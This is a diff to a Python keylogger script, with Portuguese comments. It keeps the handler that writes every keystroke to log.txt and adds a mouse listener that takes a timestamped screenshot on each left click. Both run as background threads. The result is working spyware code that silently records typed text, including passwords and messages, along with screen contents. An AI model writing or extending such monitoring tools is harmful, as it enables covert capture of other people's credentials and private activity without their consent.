@@ -1,4 +1,9 @@
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Key, Listener as KeyListener
+from pynput.mouse import Button, Listener as MouseListener
+import pyautogui  
+import time
+import threading
+
 
 log_file = "log.txt"
 
@@ -10,10 +15,36 @@ def on_press(key):
   except AttributeError:
     with open(log_file, "a") as f:
       if key==Key.space:
-        f.write("")
+        f.write(" ")
       elif key==Key.enter:
         f.write("\n")
       else:
         f.write(f"[{str(key)}] ")
-  with Listener(on_press=on_press) as listener:
-    listener.join
+
+def on_click(x, y, button, pressed):
+    if button == Button.left and pressed:
+        timestamp = time.strftime("%Y%m%d_%H%M%S")
+        filename = f"screenshot_{timestamp}.png"
+        pyautogui.screenshot(filename)
+        print(f"Screenshot salvo: {filename}")
+
+# Executar os dois listeners em threads separadas
+listener1 = KeyListener(on_press=on_press)
+listener2 = MouseListener(on_click=on_click)
+
+thread1 = threading.Thread(target=listener1.start)
+thread2 = threading.Thread(target=listener2.start)
+
+thread1.daemon = True
+thread2.daemon = True
+
+thread1.start()
+thread2.start()
+
+try:
+    while True:
+        time.sleep(1)
+except KeyboardInterrupt:
+    print("Encerrando...")
+    listener1.stop()
+    listener2.stop()
